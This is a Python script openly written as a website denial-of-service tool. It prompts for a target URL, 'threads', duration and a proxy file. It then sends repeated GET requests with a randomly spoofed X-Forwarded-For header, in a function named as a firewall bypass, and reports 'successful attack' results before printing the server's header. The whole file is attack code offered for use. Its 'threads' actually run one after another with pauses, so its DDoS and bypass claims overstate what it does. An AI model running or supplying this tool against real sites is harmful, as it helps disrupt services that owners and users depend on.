import os
import time
import random
import requests
from colorama import Fore, Style

def generate_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def bypass_firewall(url, proxies=None):
    try:
        headers = {
            "X-Forwarded-For": generate_ip(),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
        }
        response = requests.get(url, headers=headers, proxies=proxies)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def detect_server_info(url):
    try:
        response = requests.get(url)
        return response.status_code, response.headers.get('Server', 'Unknown')
    except requests.exceptions.RequestException:
        return None, None

def ddos_attack(url, threads, duration, proxies=None):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(threads):
            if bypass_firewall(url, proxies):
                print(Fore.GREEN + f"Successful attack on {url}" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Failed attack on {url}" + Style.RESET_ALL)
            time.sleep(0.1)

def main():
    website_url = input("Enter the website URL to attack: ")
    threads = int(input("Enter the number of threads: "))
    duration = int(input("Enter the duration in seconds: "))
    proxy_file = input("Enter the path to the proxy file (leave empty for no proxy): ")

    proxies = None
    if proxy_file:
        with open(proxy_file, 'r') as f:
            proxies = {'http': f.readline().strip(), 'https': f.readline().strip()}

    print(f"Attacking {website_url} with {threads} threads for {duration} seconds...")
    ddos_attack(website_url, threads, duration, proxies)

    status_code, server_info = detect_server_info(website_url)
    if status_code:
        print(f"Server Status Code: {status_code}")
        print(f"Server Info: {server_info}")
    else:
        print("Failed to detect server information.")

if __name__ == "__main__":
    main()